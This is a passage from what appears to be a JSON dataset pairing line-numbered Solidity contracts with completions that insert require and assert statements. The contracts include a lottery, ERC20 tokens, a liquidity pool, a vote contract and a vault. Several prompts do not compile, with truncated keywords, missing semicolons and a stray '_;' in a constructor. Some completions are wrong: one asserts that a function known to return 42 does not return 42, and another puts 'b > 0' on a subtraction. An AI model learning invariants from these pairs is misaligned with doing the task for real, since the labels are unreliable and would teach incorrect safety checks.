require(winningId != 0, \"not drawn\");\n34                }\n35          function multiBuy(uint[] ids, uint[] amounts)\n36          external {\n37                  require(winningId == 0, \"already drawn\");\n38                  uint totalAmount = 0;\n39                  for (int i = 0; i < ids.length; i++) {\n40                  tickets[msg.sender][ids[i]] += amounts[i];\n41                  totalAmount += amounts[i];\n42          }\n43               receivePayment(msg.sender, totalAmount);\n44          }\n45 }",
        "completion": "17+ require(!drawingPhase, \"drawing\");\n35+ require(!drawingPhase, \"drawing\");\n"
    },
    {
        "prompt": "1 // SPDX-License-Identifier: MIT\n2  pragma solidity >=0.4.24 <0.6.0;\n3 \n4 contract testlock {\n5             \n6          function test_lock(\n7                  uint lock,\n8                  uint newLock,\n9                  uint amount\n10                  ) external {\n11 \n12                  require(amount >= allLocks[lock].depositAmount, 'wrong amount');\n13                  memory config = allLocks[lock];\n14                  config.depositAmount = amount;\n15                  if(newLock != 0) {\n16                      mapLocktoToken(newLock, config);\n17                  }           \n18                }\n19   } ",
        "completion": "12+  require(amount >= allLocks[lock].depositAmount, 'wrong amount');\n"
    },
    {
        "prompt": "1 // SPDX-License-Identifier: GPL-3.0-or-later\n2 \n3 pragma solidity >=0.8.0;\n4 \n5 \n6 contract ConcentratedLiquidityPool is IPool {\n7     using Ticks for mapping(int24 => Ticks.Tick);\n8 \n9     event Mint(address indexed sender, uint256 amount0, uint256 amount1, address indexed recipient);\n10     event Burn(address indexed sender, uint256 amount0, uint256 amount1, address indexed recipient);\n11     event Collect(address indexed sender, uint256 amount0, uint256 amount1);\n12     event Sync(uint256 reserveShares0, uint256 reserveShares1);\n13 \n14     /// @dev References for tickSpacing:\n15     // 100 tickSpacing -> 2% between ticks.\n16     bytes32 public constant override poolIdentifier = \"Trident:ConcentratedLiquidity\";\n17 \n18     uint24 internal constant MAX_FEE = 100000; /// @dev Maximum `swapFee` is 10%.\n19 \n20     uint128 internal immutable MAX_TICK_LIQUIDITY;\n21     uint24 internal immutable tickSpacing;\n22     uint24 internal immutable swapFee; /// @dev 1000 corresponds to 0.1% fee. Fee is measured in pips.\n23 \n24     address internal immutable barFeeTo;\n25     IBentoBoxMinimal internal immutable bento;\n26     IMasterDeployer internal immutable masterDeployer;\n27 \n28     address internal immutable token0;\n29     address internal immutable token1;\n30 \n31     uint128 public liquidity;\n32 \n33     uint160 internal secondsPerLiquidity; /// @dev Multiplied by 2^128.\n34     uint32 internal lastObservation;\n35 \n36     uint256 public feeGrowthGlobal0; /// @dev All fee growth counters are multiplied by 2^128.\n37     uint256 public feeGrowthGlobal1;\n38 \n39     uint256 public barFee;\n40 \n41     uint128 internal token0ProtocolFee;\n42     uint128 internal token1ProtocolFee;\n43 \n44     uint128 internal reserve0; /// @dev `bento` share balance tracker.\n45     uint128 internal reserve1;\n46 \n47     uint160 internal price; /// @dev Sqrt of price aka. \u221a(y/x), multiplied by 2^96.\n48     int24 internal nearestTick; /// @dev Tick that is just below the current price.\n49 \n50     uint256 internal unlocked;\n51     modifier lock() {\n52         require(unlocked == 1, \"LOCKED\");\n53         unlocked = 2;\n54         _;\n55         unlocked = 1;\n56     }\n57 \n58     mapping(int24 => Ticks.Tick) public ticks;\n59     mapping(address => mapping(int24 => mapping(int24 => Position))) public positions;\n60 \n61     struct Position {\n62         uint128 liquidity;\n63         uint256 feeGrowthInside0Last;\n64         uint256 feeGrowthInside1Last;\n65     }\n66 \n67     struct SwapCache {\n68         uint256 feeAmount;\n69         uint256 totalFeeAmount;\n70         uint256 protocolFee;\n71         uint256 feeGrowthGlobal;\n72         uint256 currentPrice;\n73         uint256 currentLiquidity;\n74         uint256 input;\n75         int24 nextTickToCross;\n76     }\n77 \n78     struct MintParams {\n79         int24 lowerOld;\n80         int24 lower;\n81         int24 upperOld;\n82         int24 upper;\n83         uint256 amount0Desired;\n84         uint256 amount1Desired;\n85         bool token0native;\n86         bool token1native;\n87         /// @dev To mint an NFT the positionOwner should be set to the positionManager contract.\n88         address positionOwner;\n89         /// @dev When minting through the positionManager contract positionRecipient should be the NFT recipient.\n90         //    It can be set to address(0) if we are not minting through the positionManager contract.\n91         address positionRecipient;\n92     }\n93 \n94     /// @dev Only set immutable variables here - state changes made here will not be used.\n95     constructor(bytes memory _deployData, IMasterDeployer _masterDeployer) {\n96         (address _token0, address _token1, uint24 _swapFee, uint160 _price, uint24 _tickSpacing) = abi.decode(\n97             _deployData,\n98             (address, address, uint24, uint160, uint24)\n99         );\n100 \n101         require(_token0 != address(0), \"ZERO_ADDRESS\");\n102         require(_token0 != address(this), \"INVALID_TOKEN0\");\n103         require(_token1 != address(this), \"INVALID_TOKEN1\");\n104         require(_swapFee <= MAX_FEE, \"INVALID_SWAP_FEE\");\n105         \n106         token0 = _token0;\n107         token1 = _token1;\n108         swapFee = _swapFee;\n109         price = _price;\n110         tickSpacing = _tickSpacing;\n111         /// @dev Prevents global liquidity overflow in the case all ticks are initialised.\n112         MAX_TICK_LIQUIDITY = Ticks.getMaxLiquidity(_tickSpacing);\n113         ticks[TickMath.MIN_TICK] = Ticks.Tick(TickMath.MIN_TICK, TickMath.MAX_TICK, uint128(0), 0, 0, 0);\n114         ticks[TickMath.MAX_TICK] = Ticks.Tick(TickMath.MIN_TICK, TickMath.MAX_TICK, uint128(0), 0, 0, 0);\n115         nearestTick = TickMath.MIN_TICK;\n116         bento = IBentoBoxMinimal(_masterDeployer.bento());\n117         barFeeTo = _masterDeployer.barFeeTo();\n118         barFee = _masterDeployer.barFee();\n119         masterDeployer = _masterDeployer;\n120         unlocked = 1;\n121     }\n122 \n123     function burn(bytes calldata data) public override lock returns (IPool.TokenAmount[] memory withdrawnAmounts) {\n124         (int24 lower, int24 upper, uint128 amount, address recipient, bool unwrapBento) = abi.decode(\n125             data,\n126             (int24, int24, uint128, address, bool)\n127         );\n128 \n129         uint160 priceLower = TickMath.getSqrtRatioAtTick(lower);\n130         uint160 priceUpper = TickMath.getSqrtRatioAtTick(upper);\n131         uint160 currentPrice = price;\n132 \n133         unchecked {\n134             if (priceLower < currentPrice && currentPrice < priceUpper) liquidity -= amount;\n135         }\n136 \n137         (uint256 amount0, uint256 amount1) = _getAmountsForLiquidity(\n138             uint256(priceLower),\n139             uint256(priceUpper),\n140             uint256(currentPrice),\n141             uint256(amount)\n142         );\n143 \n144         (uint256 amount0fees, uint256 amount1fees) = _updatePosition(msg.sender, lower, upper, -int128(amount));\n145 \n146         unchecked {\n147             amount0 += amount0fees;\n148             amount1 += amount1fees;\n149         }\n150 \n151         withdrawnAmounts = new TokenAmount[](2);\n152         withdrawnAmounts[0] = TokenAmount({token: token0, amount: amount0});\n153         withdrawnAmounts[1] = TokenAmount({token: token1, amount: amount1});\n154 \n155         unchecked {\n156             reserve0 -= uint128(amount0fees);\n157             reserve1 -= uint128(amount1fees);\n158         }\n159 \n160         _transferBothTokens(recipient, amount0, amount1, unwrapBento);\n161 \n162         nearestTick = Ticks.remove(ticks, lower, upper, amount, nearestTick);\n163         emit Burn(msg.sender, amount0, amount1, recipient);\n164     }\n165 \n166     function burnSingle(bytes calldata) public override returns (uint256) {\n167         revert();\n168     }\n169 \n170     function collect(\n171         int24 lower,\n172         int24 upper,\n173         address recipient,\n174         bool unwrapBento\n175     ) public lock returns (uint256 amount0fees, uint256 amount1fees) {\n176         (amount0fees, amount1fees) = _updatePosition(msg.sender, lower, upper, 0);\n177 \n178         _transferBothTokens(recipient, amount0fees, amount1fees, unwrapBento);\n179 \n180         reserve0 -= uint128(amount0fees);\n181         reserve1 -= uint128(amount1fees);\n182 \n183         emit Collect(msg.sender, amount0fees, amount1fees);\n184     }\n185 }",
        "completion": "42+ assert(Old(reserve0) == reserve0);\n42+ assert(Old(reserve1) == reserve1);\n152+ assert(Old(reserve0) == reserve0 + amount0);\n152+ assert(Old(reserve1) == reserve1+ amount1);\n"
    },
    {
        "prompt": "1 // SPDX-License-Identifier: GPL-3.0-or-later\n2 \n3 pragma solidity >=0.8.0;\n4 \n5 \n6 contract ConcentratedLiquidityPool is IPool {\n7     using Ticks for mapping(int24 => Ticks.Tick);\n8 \n9     event Burn(address indexed sender, uint256 amount0, uint256 amount1, address indexed recipient);\n10     event Sync(uint256 reserveShares0, uint256 reserveShares1);\n11 \n12  \n13     bytes32 public constant override poolIdentifier = \"Trident:ConcentratedLiquidity\";\n14 \n15     uint24 internal constant MAX_FEE = 100000; \n16 \n17     uint128 internal immutable MAX_TICK_LIQUIDITY;\n18     uint24 internal immutable tickSpacing;\n19     uint24 internal immutable swapFee;\n20 \n21     address internal immutable barFeeTo;\n22     IBentoBoxMinimal internal immutable bento;\n23     IMasterDeployer internal immutable masterDeployer;\n24 \n25     address internal immutable token0;\n26     address internal immutable token1;\n27 \n28     uint128 public liquidity;\n29 \n30     uint160 internal secondsPerLiquidity; \n31     uint32 internal lastObservation;\n32 \n33     uint256 public feeGrowthGlobal0; \n34     uint256 public feeGrowthGlobal1;\n35 \n36     uint256 public barFee;\n37 \n38     uint128 internal token0ProtocolFee;\n39     uint128 internal token1ProtocolFee;\n40 \n41     uint128 internal reserve0; \n42     uint128 internal reserve1;\n43 \n44     uint160 internal price; \n45     int24 internal nearestTick; \n46 \n47     uint256 internal unlocked;\n48     modifier lock() {\n49         require(unlocked == 1, \"LOCKED\");\n50         unlocked = 2;\n51         _;\n52         unlocked = 1;\n53     }\n54 \n55     mapping(int24 => Ticks.Tick) public ticks;\n56     mapping(address => mapping(int24 => mapping(int24 => Position))) public positions;\n57 \n58     struct Position {\n59         uint128 liquidity;\n60         uint256 feeGrowthInside0Last;\n61         uint256 feeGrowthInside1Last;\n62     }\n63 \n64     struct SwapCache {\n65         uint256 feeAmount;\n66         uint256 totalFeeAmount;\n67         uint256 protocolFee;\n68         uint256 feeGrowthGlobal;\n69         uint256 currentPrice;\n70         uint256 currentLiquidity;\n71         uint256 input;\n72         int24 nextTickToCross;\n73     }\n74 \n75     struct MintParams {\n76         int24 lowerOld;\n77         int24 lower;\n78         int24 upperOld;\n79         int24 upper;\n80         uint256 amount0Desired;\n81         uint256 amount1Desired;\n82         bool token0native;\n83         bool token1native;\n84         address positionOwner;\n85         address positionRecipient;\n86     }\n87 \n88     constructor(bytes memory _deployData, IMasterDeployer _masterDeployer) {\n89         (address _token0, address _token1, uint24 _swapFee, uint160 _price, uint24 _tickSpacing) = abi.decode(\n90             _deployData,\n91             (address, address, uint24, uint160, uint24)\n92         );\n93 \n94         require(_token0 != address(0), \"ZERO_ADDRESS\");\n95         require(_token0 != address(this), \"INVALID_TOKEN0\");\n96         require(_token1 != address(this), \"INVALID_TOKEN1\");\n97         require(_swapFee <= MAX_FEE, \"INVALID_SWAP_FEE\");\n98         \n99         token0 = _token0;\n100         token1 = _token1;\n101         swapFee = _swapFee;\n102         price = _price;\n103         tickSpacing = _tickSpacing;\n104         MAX_TICK_LIQUIDITY = Ticks.getMaxLiquidity(_tickSpacing);\n105         ticks[TickMath.MIN_TICK] = Ticks.Tick(TickMath.MIN_TICK, TickMath.MAX_TICK, uint128(0), 0, 0, 0);\n106         ticks[TickMath.MAX_TICK] = Ticks.Tick(TickMath.MIN_TICK, TickMath.MAX_TICK, uint128(0), 0, 0, 0);\n107         nearestTick = TickMath.MIN_TICK;\n108         bento = IBentoBoxMinimal(_masterDeployer.bento());\n109         barFeeTo = _masterDeployer.barFeeTo();\n110         barFee = _masterDeployer.barFee();\n111         masterDeployer = _masterDeployer;\n112         unlocked = 1;\n113     }\n114 \n115     function burn(bytes calldata data) public override lock returns (IPool.TokenAmount[] memory withdrawnAmounts) {\n116         (int24 lower, int24 upper, uint128 amount, address recipient, bool unwrapBento) = abi.decode(\n117             data,\n118             (int24, int24, uint128, address, bool)\n119         );\n120 \n121         uint160 priceLower = TickMath.getSqrtRatioAtTick(lower);\n122         uint160 priceUpper = TickMath.getSqrtRatioAtTick(upper);\n123         uint160 currentPrice = price;\n124 \n125         unchecked {\n126             if (priceLower < currentPrice && currentPrice < priceUpper) liquidity -= amount;\n127         }\n128 \n129         (uint256 amount0, uint256 amount1) = _getAmountsForLiquidity(\n130             uint256(priceLower),\n131             uint256(priceUpper),\n132             uint256(currentPrice),\n133             uint256(amount)\n134         );\n135 \n136         (uint256 amount0fees, uint256 amount1fees) = _updatePosition(msg.sender, lower, upper, -int128(amount));\n137 \n138         unchecked {\n139             amount0 += amount0fees;\n140             amount1 += amount1fees;\n141         }\n142 \n143         withdrawnAmounts = new TokenAmount[](2);\n144         withdrawnAmounts[0] = TokenAmount({token: token0, amount: amount0});\n145         withdrawnAmounts[1] = TokenAmount({token: token1, amount: amount1});\n146 \n147         unchecked {\n148             reserve0 -= uint128(amount0fees);\n149             reserve1 -= uint128(amount1fees);\n150         }\n151 \n152         _transferBothTokens(recipient, amount0, amount1, unwrapBento);\n153 \n154         nearestTick = Ticks.remove(ticks, lower, upper, amount, nearestTick);\n155         emit Burn(msg.sender, amount0, amount1, recipient);\n156     }\n157 }",
        "completion": "42+ assert(Old(reserve0) == reserve0);\n42+ assert(Old(reserve1) == reserve1);\n152+ assert(Old(reserve0) == reserve0 + amount0);\n152+ assert(Old(reserve1) == reserve1+ amount1);\n"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n\n2 contract DoWhileLoop {\n\n3     function testDoWhileLoop() public {\n4         uint i = 1;\n5         uint sum = 0;\n6         do {\n7             sum += i;\n8             ++i;\n9         } while (i < 1);\n       \n10     }\n\n11 }",
        "completion": "9+ assert (sum == 1);"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n2 contract B {\n3    function funcB() public pure returns (uint) {\n4        return 42;\n5    }\n6    constructor() public {}\n7 }\n\n8 contract A {\n9    function funcA1() public pure returns (uint) {\n10        return 11;\n11    }\n12    function funcA2(uint x) public pure returns (uint) {\n13        return x+1;\n14    }\n15    function funcA3() public returns (B) {\n16        B retVal= new B();\n17        return retVal;\n18    }\n19    constructor() public\n20     {\n21 \t_;\n22     }\n23 }",
        "completion": "20+ assert(funcA2(funcA1())==12);\n20+ assert(funcA3().funcB()!=42);"
    },
    {
        "prompt": "1 pragma solidity ^0.4.24;\n\n\n2 library Math {\n    \n3     function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n4         if (a == 0) {\n5             return 0;\n6         }\n7         uint256 c = a * b;\n8         assert(c / a == b);\n9         return c;\n10     }\n\n11     function div(uint256 a, uint256 b) internal pure returns (uint256) {\n12         return a / b;\n13     }\n\n14     function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n15         assert(b <= a);\n16         return a - b;\n17     }\n\n18     function add(uint256 a, uint256 b) internal pure returns (uint256) {\n19         uint256 c = a + b;\n20         assert(c >= a);\n21         return c;\n22     }\n23 }",
        "completion": "8+ assert(c / a == b);\n15+  assert(b <= a);\n20+   assert(c >= a);"
    },
    {
        "prompt": "1 pragma solidity ^0.4.21;\n\n2 library SafeMath {\n\n\n3   function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n4     if (a == 0) {\n5       return 0;\n6     }\n7     uint256 c = a * b;\n8     assert(c / a == b);\n9     return c;\n10   }\n\n11   function div(uint256 a, uint256 b) internal pure returns (uint256) {\n\n12     return a / b;\n13   }\n\n\n14   function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n15     assert(b <= a);\n16     return a - b;\n17   }\n\n\n18   function add(uint256 a, uint256 b) internal pure returns (uint256) {\n19     uint256 c = a + b;\n20     assert(c >= a);\n21     return c;\n22   }\n23 }\n\n\n24 contract ERC20Basic {\n25   function totalSupply() public view returns (uint256);\n26   function balanceOf(address who) public view returns (uint256);\n27   function transfer(address to, uint256 value) public returns (bool);\n28   event Transfer(address indexed from, address indexed to, uint256 value);\n29 }\n\n\n30 contract ERC20 is ERC20Basic {\n31   function allowance(address owner, address spender) public view returns (uint256);\n32   function transferFrom(address from, address to, uint256 value) public returns (bool);\n33   function approve(address spender, uint256 value) public returns (bool);\n34   event Approval(address indexed owner, address indexed spender, uint256 value);\n35 }\n\n\n36 contract BasicToken is ERC20Basic {\n37   using SafeMath for uint256;\n\n38   mapping(address => uint256) balances;\n\n39   uint256 totalSupply_;\n\n40   function totalSupply() public view returns (uint256) {\n41     return totalSupply_;\n42   }\n\n \n43   function transfer(address _to, uint256 _value) public returns (bool) {\n44     require(_to != address(0));\n45     require(_value <= balances[msg.sender]);\n\n46     balances[msg.sender] = balances[msg.sender].sub(_value);\n47     balances[_to] = balances[_to].add(_value);\n48     emit Transfer(msg.sender, _to, _value);\n49     return true;\n50   }\n\n \n51   function balanceOf(address _owner) public view returns (uint256 balance) {\n52     return balances[_owner];\n53   }\n\n54 }\n\n\n55 contract StandardToken is ERC20, BasicToken {\n\n56   mapping (address => mapping (address => uint256)) internal allowed;\n\n\n57   function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n58     require(_to != address(0));\n59     require(_value <= balances[_from]);\n60     require(_value <= allowed[_from][msg.sender]);\n\n61     balances[_from] = balances[_from].sub(_value);\n62     balances[_to] = balances[_to].add(_value);\n63     allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n64     emit Transfer(_from, _to, _value);\n65     return true;\n66   }\n\n \n67   function approve(address _spender, uint256 _value) public returns (bool) {\n68     allowed[msg.sender][_spender] = _value;\n69     emit Approval(msg.sender, _spender, _value);\n70     return true;\n71   }\n\n\n72   function allowance(address _owner, address _spender) public view returns (uint256) {\n73     return allowed[_owner][_spender];\n74   }\n\n \n75   function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n76     allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n77     emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n78     return true;\n79   }\n\n \n80   function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n81     uint oldValue = allowed[msg.sender][_spender];\n82     if (_subtractedValue > oldValue) {\n83       allowed[msg.sender][_spender] = 0;\n84     } else {\n85       allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n86     }\n87     emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n88     return true;\n89   }\n\n90 }\n91 contract EZDEX is StandardToken {\n    \n92     string public constant name = \"EZDEX\";\n93     string public constant symbol = \"EZX\";\n94     uint8 public constant decimals = 18;\n    \n95     uint256 public constant INITIAL_SUPPLY = 1000000000000000000000000000;\n    \n96     function EZDEX() {\n97         totalSupply_ = INITIAL_SUPPLY;\n98         balances[msg.sender] = INITIAL_SUPPLY;\n99     }\n    \n100 }",
        "completion": "8+     assert(c / a == b);\n15+     assert(b <= a);\n20+     assert(c >= a);\n44+    require(_to != address(0));\n45+     require(_value <= balances[msg.sender]);"
    },
    {
        "prompt": "1 pragma solidity ^0.4.25;\n\n2 library SafeMath {\n3   function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n4     uint256 c = a * b;\n5     return c;\n6   }\n\n7   function div(uint256 a, uint256 b) internal pure returns (uint256) {\n    \n8     uint256 c = a / b;\n9     return c;\n10   }\n\n11   function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n12     return a - b;\n13   }\n\n14   function add(uint256 a, uint256 b) internal pure returns (uint256) {\n15     uint256 c = a + b;\n\n16     return c;\n17   }\n\n18   function toUINT112(uint256 a) internal pure returns(uint112) {\n19     assert(uint112(a) == a);\n20     return uint112(a);\n21   }\n\n22   function toUINT120(uint256 a) internal pure returns(uint120) {\n23     assert(uint120(a) == a);\n24     return uint120(a);\n25   }\n\n26   function toUINT128(uint256 a) internal pure returns(uint128) {\n27     assert(uint128(a) == a);\n28     return uint128(a);\n29   }\n30 }\n\n31 contract ERC20Basic {\n32   uint256 public totalSupply;\n33   function balanceOf(address who) public constant returns (uint256);\n34   function transfer(address to, uint256 value) public returns (bool);\n35   event Transfer(address indexed from, address indexed to, uint256 value);\n36 }\n\n37 contract ERC20 is ERC20Basic {\n38   function allowance(address owner, address spender) public constant returns (uint256);\n39   function transferFrom(address from, address to, uint256 value) public returns (bool);\n40   function approve(address spender, uint256 value) public returns (bool);\n41   event Approval(address indexed owner, address indexed spender, uint256 value);\n42 }\n\n43 contract BasicToken is ERC20Basic {\n44   using SafeMath for uint256;\n\n45   mapping(address => uint256) balances;\n\n\n46   function transfer(address _to, uint256 _value) public returns (bool) {\n47     require(_to != address(0));\n48     require(_value <= balances[msg.sender]);\n\n\n49     balances[msg.sender] = balances[msg.sender].sub(_value);\n50     balances[_to] = balances[_to].add(_value);\n51     emit Transfer(msg.sender, _to, _value);\n52     return true;\n53   }\n\n54   /**\n55   * @dev Gets the balance of the specified address.\n56   * @param _owner The address to query the the balance of.\n57   * @return An uint256 representing the amount owned by the passed address.\n58   */\n59   function balanceOf(address _owner) public constant returns (uint256 balance) {\n60     return balances[_owner];\n61   }\n\n62 }\n\n63 contract StandardToken is ERC20, BasicToken {\n\n64   mapping (address => mapping (address => uint256)) internal allowed;\n\n\n65   /**\n66    * @dev Transfer tokens from one address to another\n67    * @param _from address The address which you want to send tokens from\n68    * @param _to address The address which you want to transfer to\n69    * @param _value uint256 the amount of tokens to be transferred\n70    */\n71   function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n72     require(_to != address(0));\n73     require(_value <= balances[_from]);\n74     require(_value <= allowed[_from][msg.sender]);\n\n75     balances[_from] = balances[_from].sub(_value);\n76     balances[_to] = balances[_to].add(_value);\n77     allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n78     emit Transfer(_from, _to, _value);\n79     return true;\n80   }\n\n \n81   function approve(address _spender, uint256 _value) public returns (bool) {\n82     require((_value == 0) || (allowed[msg.sender][_spender] == 0));\n83     allowed[msg.sender][_spender] = _value;\n84     emit Approval(msg.sender, _spender, _value);\n85     return true;\n86   }\n\n \n87   function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n88     return allowed[_owner][_spender];\n89   }\n\n90 }\n\n91 contract SOLVECARE is StandardToken {\n\n92   string public constant name = \"t.me/solvecareofficial\";\n93   string public constant symbol = \"SOLVE\";\n94   uint8 public constant decimals = 18;\n\n\n95   uint256 public constant INITIAL_SUPPLY = 1000000000 * (10 ** uint256(decimals));\n  \n96   constructor() public {\n97     totalSupply = INITIAL_SUPPLY;\n98     balances[msg.sender] = INITIAL_SUPPLY;\n99     emit Transfer(msg.sender, msg.sender, INITIAL_SUPPLY);\n100   }\n\n101 }",
        "completion": "4+ assert(a == 0 || c / a == b);\n7+ assert(b > 0); \n11+  assert(b > 0); \n15+ assert(c >= a);\n19+  assert(uint112(a) == a);\n27+ assert(uint128(a) == a);\n47+ require(_to != address(0));\n48+ require(_value <= balances[msg.sender]);\n72+ require(_to != address(0));\n73+ require(_value <= balances[_from]);\n74+ require(_value <= allowed[_from][msg.sender]);\n82+ require((_value == 0) || (allowed[msg.sender][_spender] == 0));"
    },
    {
        "prompt": "1 // SPDX-License-Identifier: MIT OR Apache-2.0\n2 pragma solidity >=0.6.11;\n\n3  */\n4 contract Replica {\n \n5     /**\n6      * @notice Emitted when message is processed\n7      * @param messageHash Hash of message that failed to process\n8      * @param success TRUE if the call was executed successfully, FALSE if the call reverted\n9      * @param returnData the return data from the external call\n10      */\n11     event Process(\n12         bytes32 indexed messageHash,\n13         bool indexed success,\n14         bytes indexed returnData\n15     );\n\n   \n\n16     function initialize(\n17         uint32 _remoteDomain,\n18         address _updater,\n19         bytes32 _committedRoot,\n20         uint256 _optimisticSeconds\n21     ) public initializer {\n22         __NomadBase_initialize(_updater);\n23         // set storage variables\n24         entered = 1;\n25         remoteDomain = _remoteDomain;\n26         committedRoot = _committedRoot;     \n27         confirmAt[_committedRoot] = 1;\n28         optimisticSeconds = _optimisticSeconds;\n29         emit SetOptimisticTimeout(_optimisticSeconds);\n30     }\n31}",
        "completion": "26+ assert(_committedRoot !=0); "
    },
    {
        "prompt": "1 contract Vote {\n2    struct Proposal {\n3       uint160 sTime; address newOwner;\n4  }\n5   IERC20 votingToken;\n6   IERC20 LockedToken;\n7   address owner;\n8   Proposal proposal;\n\n9  function propose() external {\n10       require(proposal.sTime == 0, \"on-going proposal\");\n11       proposal = Proposal(block.timestamp, msg.sender);\n12    }\n13  function vote(uint amount) external {\n14     require(proposal.sTime + 2 days > block.timestamp,\n15      \"voting has ended\");\n16     votingToken.transferFrom(\n17     msg.sender, address(this), amount);\n18  }\n19  function end() external {\n20     require(proposal.sTime != 0, \"no proposal\");\n21     require(proposal.sTime + 2 days < block.timestamp,\n22    \"voting has not ended\");\n23    require(votingToken.balanceOf(address(this))*2 >\n24    votingToken.totalSupply(), \"vote failed\");\n25    owner = proposal.newOwner;\n26    delete proposal;\n27  }\n\n28 function getLockedFunds() external onlyOwner {\n29      return LockedToken;\n\n30    }\n31 }",
        "completion": "10+ require(proposal.sTime == 0, \"on-going proposal\");\n11+ assert(Old(votingToken.balanceOf(address(this))) == 0);\n14+ require(proposal.sTime + 2 days > block.timestamp,\n \"voting has ended\");\n17+ assert(Old(votingToken.balanceOf(address(this))) ==votingToken.balanceOf(address(this)));\n20+ require(proposal.sTime != 0, \"no proposal\");\n21+  require(proposal.sTime + 2 days < block.timestamp,\n \"voting has not ended\");\n23+ require(votingToken.balanceOf(address(this))*2 >\nvotingToken.totalSupply(), \"vote failed\");\n24+ assert(Old(votingToken.balanceOf(address(this)))==votingToken.balanceOf(address(this)));\n"
    },
    {
        "prompt": "1  contract Lottery {\n2  // user address -> lottery id -> count\n3  mapping (address => mapping(uint64 => uint))\n4  public tickets;\n5  uint64 winningId; // the winning id\n6  bool drawingPhase; // whether the owner is drawing\n\n7  // invoked every day to reset a round\n8  function reset() external onlyOwner {\n9  delete tickets;\n10  winningId = 0; drawingPhase = false;\n11  }\n12  function buy(uint64 id, uint amount) external {\n13  require(winningId == 0, \"already drawn\");\n14  require(!drawingPhase, \"drawing\")\n15  receivePayment(msg.sender, amount),\n16  tickets[msg.sender][id] += amount;\n17  }\n18  function enterDrawingPhase() external onlyOwner {\n19  drawingPhase = true;\n20  }\n21  // id is randomly chosen off-chain, i.e., by chainlink\n22  function draw(uint64 id) external onlyOwner {\n23  require(winningId == 0, \"already drawn\");\n24  require(drawingPhase, \"not drawing\");\n25  require(id != 0, \"invalid winning number\");\n26  winningId = id;\n27  }\n28  // claim reward for winners\n29 function claimReward() external {\n30  require(winningId != 0, \"not drawn\");\n\n31  }\n32  function multiBuy(uint64[] ids, uint[] amounts)\n33  external {\n34  require(winningId == 0, \"already drawn\");\n35   uint totalAmount = 0;\n36  for (int i = 0; i < ids.length; i++) {\n37   tickets[msg.sender][ids[i]] += amounts[i];\n38   totalAmount += amounts[i];\n39  }\n40  receivePayment(msg.sender, totalAmount),\n41  }\n42 }",
        "completion": "13+  require(winningId == 0, \"already drawn\");\n14+  require(!drawingPhase, \"drawing\")\n23+  require(winningId == 0, \"already drawn\");\n24+  require(drawingPhase, \"not drawing\");\n25+  require(id != 0, \"invalid winning number\");\n34+  require(winningId == 0, \"already drawn\");\n"
    },
    {
        "prompt": "1 // SPDX-License-Identifier: AGPL-3.0-or-later\n\n2 pragma solidity 0.8.9;\n\n3 import \"./BaseVault.sol\";\n4 ct STETHVault is BaseVault {\n5     using SafeERC20 for IERC20Metadata;\n6     using AuxMath for uint256;\n7     using AuxMath for AuxMath.Fractional;\n8     using DepositQueueLib for DepositQueueLib.DepositQueue;\n\n9     uint8 public immutable sharePriceDecimals;\n10     uint256 public lastRoundAssets;\n11     AuxMath.Fractional public lastSharePrice;\n\n12     /*\n13      @dev investorRatio is the proportion that the weekly yield will be splitted\n14      The precision of this number is set by the variable DENOMINATOR. 5000 is equivalent to 50%\n15     */\n16     uint256 public constant investorRatio = 5000;\n17     address public immutable investor;\n\n18     event StartRoundData(uint256 indexed roundId, uint256 lastRoundAssets, uint256 sharePrice);\n19     event EndRoundData(\n20         uint256 indexed roundId,\n21         uint256 roundAccruedInterest,\n22         uint256 investmentYield,\n23         uint256 idleAssets\n24     );\n25     event SharePrice(uint256 indexed roundId, uint256 startSharePrice, uint256 endSharePrice);\n\n26     constructor(\n27         IConfigurationManager _configuration,\n28         IERC20Metadata _asset,\n29         address _investor\n30     ) BaseVault(_configuration, _asset) {\n31         investor = _investor;\n32         sharePriceDecimals = _asset.decimals();\n33     }\n\n34     function name() public view override returns (string memory) {\n35         return string(abi.encodePacked(_asset.symbol(), \" Volatility Vault\"));\n36     }\n\n37     function symbol() public view override returns (string memory) {\n38         return string(abi.encodePacked(_asset.symbol(), \"vv\"));\n39     }\n\n40     function _afterRoundStart(uint256) internal override {\n41         uint256 supply = totalSupply();\n\n42         lastRoundAssets = totalAssets();\n43         lastSharePrice = AuxMath.Fractional({ numerator: supply == 0 ? 0 : lastRoundAssets, denominator: supply });\n\n44         uint256 sharePrice = lastSharePrice.denominator == 0 ? 0 : lastSharePrice.mulDivDown(10**sharePriceDecimals);\n45         emit StartRoundData(currentRoundId, lastRoundAssets, sharePrice);\n46     }\n\n47     function _afterRoundEnd() internal override {\n48         uint256 roundAccruedInterest = 0;\n49         uint256 endSharePrice = 0;\n50         uint256 investmentYield = _asset.balanceOf(investor);\n51         uint256 supply = totalSupply();\n\n52         if (supply != 0) {\n53             roundAccruedInterest = totalAssets() - lastRoundAssets;\n54             uint256 investmentAmount = (roundAccruedInterest * investorRatio) / DENOMINATOR;\n\n55             // Pulls the yields from investor\n56             if (investmentYield > 0) {\n57                 _asset.safeTransferFrom(investor, address(this), investmentYield);\n58             }\n\n59             if (investmentAmount > 0) {\n60                 _asset.safeTransfer(investor, investmentAmount);\n61             }\n\n62             // End Share price needs to be calculated after the transfers between investor and vault\n63             endSharePrice = (totalAssets()).mulDivDown(10**sharePriceDecimals, supply);\n64         }\n65         uint256 startSharePrice = lastSharePrice.denominator == 0\n66             ? 0\n67             : 